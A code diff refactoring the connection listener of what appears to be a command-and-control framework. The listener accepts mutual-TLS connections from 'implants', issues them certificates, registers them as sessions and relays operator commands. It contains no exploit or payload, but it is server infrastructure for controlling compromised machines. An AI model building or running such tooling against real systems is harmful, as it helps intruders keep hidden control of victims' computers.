@@ -45,59 +45,62 @@ class Listener:
     def __init__(self, requestq: Queue):
         self.sessions = Sessions()
         # Automatically generate CA certificates for the server
-        self.certs = Certs("server")
+        self.certs = Certs("server", client=False)
 
-        # TODO: Don't hardcode the client certificates
-        client_cert = "../certs/client/rootCA.pem"
+        # Create an initial set of client certs
+        self.client_certs = Certs("implant", client=True)
+        ctx = self._mtls_cfg(self.client_certs)
+        self.ssock = self._mkssock(ctx)
 
+        # start accepting connections
+        t = threading.Thread(target=self._accept, args=(requestq,))
+        t.start()
+
+    def _mtls_cfg(self, client_certs: Certs) -> ssl.SSLContext:
         # mTLS settings
         ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
         ctx.verify_mode = ssl.CERT_REQUIRED
         ctx.load_cert_chain(certfile=self.certs.public_key, keyfile=self.certs.private_key)
-        ctx.load_verify_locations(cafile=client_cert)
-        # ctx.post_handshake_auth = True
-
-        # Create a secure socket wrapped in mTLS
-        ssock = self.mkssock(ctx)
-        # start accepting connections
-        t = threading.Thread(target=self.accept, args=(ssock, requestq))
-        t.start()
+        ctx.load_verify_locations(cafile=client_certs.rootCA)
+        return ctx
 
     # Create a secure socket
-    def mkssock(self, ctx: ssl.SSLContext) -> ssl.SSLSocket:
-        # Create a TCP socket
+    def _mkssock(self, ctx: ssl.SSLContext) -> ssl.SSLSocket:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.bind(("127.0.0.1", 31337))
             s.listen()
             return ctx.wrap_socket(s, server_side=True)
 
     # Accept connections from implants
-    def accept(self, ssock: ssl.SSLSocket, requestq: Queue):
+    def _accept(self, requestq: Queue):
         while True:
-            conn, addr = ssock.accept()
+            conn, addr = self.ssock.accept()
+            print(f"Accepted connection from {addr}")
             # conn.verify_client_post_handshake()
+            threading.Thread(target=self._handle_conn, args=(requestq, conn, addr)).start()
 
-            # Send the registration to the handler
-            data = conn.recv(1024)
-            requestq.put((data, addr))
+    def _handle_conn(self, requestq: Queue, conn: ssl.SSLSocket, addr):
+        # Send the registration to the handler
+        data = conn.recv(1024)
+        requestq.put((data, addr))
 
-            # Add the session
-            id = self.sessions.add(conn, addr)
-            print(f"implant ID: {id}")
+        # Add the session
+        id = self.sessions.add(conn, addr)
+        print(f"implant ID: {id}")
 
-            # TODO: Authenticate the implant before sending a confirmation
-            confirmation = implantpb_pb2.Message(
-                message_type=implantpb_pb2.Message.MessageType.RegistrationConfirmation,
-                data=implantpb_pb2.RegistrationConfirmation(id=id).SerializeToString()
-            ).SerializeToString()
-            conn.sendall(confirmation)
+        # TODO: Authenticate the implant before sending a confirmation
+        confirmation = implantpb_pb2.Message(
+            message_type=implantpb_pb2.Message.MessageType.RegistrationConfirmation,
+            data=implantpb_pb2.RegistrationConfirmation(id=id).SerializeToString()
+        ).SerializeToString()
+        conn.sendall(confirmation)
 
-            logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
-            logging.info(f"Accepted connection from {addr} | {id}")
+        logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
+        logging.info(f"Accepted connection from {addr} | {id}")
 
 
 # Send data to implant
-def session(conn: ssl.SSLContext):
+def session(conn: ssl.SSLSocket):
     while True:
         userin = input("[session] > ")
         if userin == "exit":
